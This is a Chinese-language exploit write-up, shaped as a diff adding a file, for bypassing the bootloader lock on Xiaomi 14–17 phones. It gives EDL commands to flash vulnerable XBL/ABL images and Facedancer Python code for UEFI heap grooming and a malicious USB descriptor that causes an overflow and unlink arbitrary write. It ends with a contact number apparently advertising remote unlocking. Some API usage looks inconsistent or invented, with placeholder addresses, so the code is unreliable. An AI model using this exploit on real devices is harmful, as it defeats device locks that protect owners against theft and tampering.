@@ -1,0 +1,198 @@
+17全系列，小米板子全系列，小米14-17全系列可用
+
+1. 前置：EDL降级刷入漏洞固件
+ 
+首先必须将设备刷入1月未修补的固件，核心是刷入漏洞所在的XBL(UEFI核心)分区，使用开源EDL工具edl.py实现：
+# 1. 设备进入EDL模式(短接测试点/按键组合)，连接电脑
+（简单粗暴售后降级）
+# 2. 刷入1月漏洞固件的XBL分区
+python edl.py w xbl january_vulnerable_xbl.img
+# 3. 刷入配套的abl(fastboot)分区，确保启动流程正常
+python edl.py w abl january_abl.img
+# 4. 重启设备，准备漏洞利用
+python edl.py reset
+
+
+2. 核心1：堆风水(Heap Feng Shui) 堆布局控制
+ 
+堆风水的目标是：让漏洞函数AllocatePool(8)分配的缓冲区，后面紧跟可被我们控制的堆块，确保溢出的24字节能精准覆盖下一个堆块的头部，为Unlink攻击做准备。
+ 
+实现原理
+ 
+UEFI的堆分配采用首次适配/最佳适配算法，我们通过恶意USB设备发送特定请求，触发UEFI USB驱动大量分配/释放与漏洞相同大小(8字节)的堆块，完成堆布局 groom：
+ 
+1.堆喷：大量分配8字节堆块，填满空闲内存，让后续分配连续化；
+2.造空洞：间隔释放堆块，制造固定间隔的8字节空闲空洞；
+3.占位：让漏洞的AllocatePool(8)刚好分配到我们制造的空洞中，确保溢出精准覆盖下一个堆块的头部。
+ 
+代码实现（基于Facedancer/GreatFET 恶意USB模拟设备）
+ 
+Facedancer是开源USB模拟工具，可完全自定义USB请求与响应，是这类USB漏洞利用的标准工具。
+
+实现代码:python
+from facedancer import FacedancerUSBHost
+from facedancer.protocols.usb import USBSetupPacket, USBRequestType, USBRecipient, USBRequest
+import time
+
+# 初始化USB Host模拟
+uh = FacedancerUSBHost()
+
+# 堆风水核心参数
+SPRAY_COUNT = 256    # 堆喷次数，根据UEFI堆大小调整
+HOLE_INTERVAL = 2    # 每隔2个块释放1个空洞
+ALLOC_SIZE = 8       # 和漏洞分配完全一致的大小，确保堆布局匹配
+
+def heap_spray():
+    """堆喷：触发UEFI分配大量8字节堆块，填满空闲堆"""
+    print("[+] 开始堆喷，分配 {} 个8字节堆块".format(SPRAY_COUNT))
+    for i in range(SPRAY_COUNT):
+        # 构造GET_DESCRIPTOR请求，触发UEFI USB驱动分配8字节临时缓冲区
+        # 该请求需逆向验证：确保目标UEFI驱动处理该请求时，会分配8字节堆内存
+        setup_pkt = USBSetupPacket(
+            request_type=USBRequestType.STANDARD | USBRecipient.DEVICE,
+            request=USBRequest.GET_DESCRIPTOR,
+            value=0x0300,  # 字符串描述符，触发小内存分配
+            index=0x0409,  # 英文语言ID
+            length=ALLOC_SIZE
+        )
+        uh.send_control_transfer(setup_pkt, data=None)
+        time.sleep(0.001)  # 避免请求过快导致UEFI丢包
+    print("[+] 堆喷完成")
+
+def create_heap_holes():
+    """制造空洞：间隔释放堆块，让漏洞分配落到可控空洞中"""
+    print("[+] 开始创建堆空洞")
+    for i in range(0, SPRAY_COUNT, HOLE_INTERVAL):
+        # 发送0长度状态请求，触发UEFI释放之前分配的临时堆块
+        setup_pkt = USBSetupPacket(
+            request_type=USBRequestType.STANDARD | USBRecipient.DEVICE,
+            request=USBRequest.GET_STATUS,
+            value=0,
+            index=0,
+            length=0
+        )
+        uh.send_control_transfer(setup_pkt, data=None)
+        time.sleep(0.001)
+    print("[+] 堆空洞创建完成，布局groom成功")
+
+# 执行堆风水流程
+if __name__ == "__main__":
+    time.sleep(2)  # 等待设备开机进入UEFI USB枚举阶段
+    heap_spray()
+    create_heap_holes()
+    
+    3. 核心2：漏洞触发 + 堆溢出 + Unlink任意地址写
+ 
+这是整个利用的核心，我们通过恶意USB设备的配置描述符响应，触发漏洞函数执行，完成溢出，并通过UEFI堆的经典Unlink攻击，实现任意地址写，直接覆盖设备锁状态变量。
+ 
+关键原理
+ 
+1.漏洞根因：AllocatePool(8) 分配8字节缓冲区，却执行CopyMem(32字节)，固定溢出24字节；
+
+2.UEFI堆头结构(ARM64)：溢出的24字节刚好完整覆盖下一个堆块的头部，结构如下：
+typedef struct {
+    UINT32 Signature;   // 4字节，堆签名，固定为"POOL"
+    UINT32 Size;        // 4字节，堆块大小
+    LIST_ENTRY Link;    // 16字节，双向链表指针(FLINK前向指针+BLINK后向指针，各8字节)
+} POOL_HEADER;
+// 总大小：4+4+16=24字节，完美匹配溢出长度
+
+3.Unlink攻击原理：当UEFI堆管理器释放被篡改的堆块时，会执行双向链表卸载操作：
+// 堆块释放时的核心代码
+FLINK->Blink = BLINK;
+BLINK->Flink = FLINK;
+我们控制FLINK和BLINK，即可实现任意地址写：
+
+- 把FLINK设为「目标设备锁变量地址 - 8」（因为FLINK->Blink对应*(FLINK+8)）
+
+- 把BLINK设为「解锁状态值0x1」
+
+- 最终执行时，会自动把0x1写入目标设备锁变量地址，完成解锁状态覆盖。
+
+
+例子代码基于Facedancer:
+
+from facedancer import FacedancerUSBDevice, USBConfiguration, USBInterface
+import time
+
+# ========== 需根据你的逆向结果修改 ==========
+DEVICE_LOCK_STATUS_ADDR = 0xXXXXXXXXXXXXXXX0  # 逆向得到的设备锁状态变量地址
+UNLOCK_VALUE = 0x0000000000000001             # 解锁对应的值，通常0=锁定，1=解锁
+# ============================================
+
+class MaliciousUnlockUSBDevice(FacedancerUSBDevice):
+    def __init__(self):
+        super().__init__(
+            vendor_id=0x18D1,
+            product_id=0x4EE0,
+            device_release=0x0100,
+            manufacturer_string="Android",
+            product_string="Bootloader Interface",
+            serial_number="0123456789ABCDEF",
+        )
+        # 构造基础USB配置，触发UEFI枚举
+        config = USBConfiguration(
+            configuration_index=1,
+            string="Default Config",
+            attributes=0x80,
+            max_power=0xFA,
+        )
+        interface = USBInterface(
+            interface_number=0,
+            alternate_setting=0,
+            interface_class=0xFF,
+            interface_subclass=0x42,
+            interface_protocol=0x01,
+            string="Fastboot Interface",
+        )
+        config.add_interface(interface)
+        self.add_configuration(config)
+
+    def handle_get_descriptor(self, req):
+        """重写描述符响应，触发漏洞并构造溢出数据"""
+        descriptor_type = req.value >> 8
+        descriptor_index = req.value & 0xFF
+
+        # 当UEFI请求配置描述符时，触发漏洞函数执行
+        if descriptor_type == 0x02:  # 0x02=配置描述符，对应漏洞的处理逻辑
+            print("[!] 收到配置描述符请求，触发漏洞！")
+
+            # ========== 构造32字节恶意溢出数据 ==========
+            # 1. 前8字节：填满漏洞分配的8字节缓冲区，无意义填充
+            fill_buf = b"A" * 8
+
+            # 2. 后24字节：覆盖下一个堆块的POOL_HEADER，实现Unlink攻击
+            # 2.1 堆签名：合法的"POOL"签名，避免UEFI堆校验崩溃
+            pool_signature = b"POOL"
+            # 2.2 堆块大小：合法的小尺寸，避免堆操作崩溃
+            pool_size = (0x20).to_bytes(4, byteorder='little')
+            # 2.3 FLINK：目标地址-8，对应Unlink的写入目标
+            flink = (DEVICE_LOCK_STATUS_ADDR - 8).to_bytes(8, byteorder='little')
+            # 2.4 BLINK：要写入的解锁值
+            blink = UNLOCK_VALUE.to_bytes(8, byteorder='little')
+
+            # 拼接完整32字节数据，刚好触发8字节分配+32字节写入的溢出
+            malicious_data = fill_buf + pool_signature + pool_size + flink + blink
+            # ============================================
+
+            # 校验长度，确保溢出精准
+            assert len(malicious_data) == 32, "恶意数据长度必须为32字节"
+            # 发送恶意数据给UEFI，触发CopyMem溢出
+            req.reply(malicious_data)
+            print("[+] 恶意描述符已发送，溢出触发完成！设备锁状态已覆盖为解锁")
+            return
+
+        # 其他描述符走默认处理
+        super().handle_get_descriptor(req)
+
+# 启动恶意USB设备，执行利用
+if __name__ == "__main__":
+    print("[*] 等待设备开机进入UEFI枚举阶段...")
+    time.sleep(1)
+    # 启动恶意设备
+    unlock_device = MaliciousUnlockUSBDevice()
+    unlock_device.run()
+
+远程联系1689515637
+
+本文编辑:1689515637
